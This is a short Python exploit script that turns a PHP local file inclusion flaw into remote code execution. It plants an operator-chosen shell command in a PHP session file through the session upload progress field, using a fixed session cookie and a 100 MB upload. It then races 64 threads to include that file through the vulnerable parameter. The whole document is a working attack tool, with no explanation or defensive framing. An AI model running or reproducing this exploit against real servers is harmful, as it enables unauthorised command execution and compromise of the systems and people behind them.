from multiprocessing.dummy import Pool as ThreadPool
import argparse
import requests

parser = argparse.ArgumentParser(description="PHP Session Include -> RCE")

parser.add_argument('URL', type=str,
                    help='URL for the vulnerable application')

# Optional positional argument
parser.add_argument('PARAMETER', type=str, help='Parameter for Local File Inclusion')

parser.add_argument('PAYLOAD', type=str, help='Payload to run on server')

# Optional argument
parser.add_argument('--session-path', type=str,
                    help='Optionally select a different path for PHP session (Default = /tmp)')

args = parser.parse_args()

url = args.URL
parameter = args.PARAMETER
payload = args.PAYLOAD
session_path = args.session_path if args.session_path else "/tmp"

cookies = {
    "PHPSESSID": "exploitme"
}

data = {
    "PHP_SESSION_UPLOAD_PROGRESS": f"<?php `{payload}` ?>"
}

open("tmp.txt", "w").write("A"*100000000)
f = open("tmp.txt", "r")



def cmd(i):
    requests.post(url, files={'f': f}, data=data, cookies=cookies)
    r = requests.get(f"{url}/?{parameter}={session_path}/sess_exploitme")
    return r.text


pool = ThreadPool(64)
result = pool.map_async(cmd, range(64)).get(0xffff)
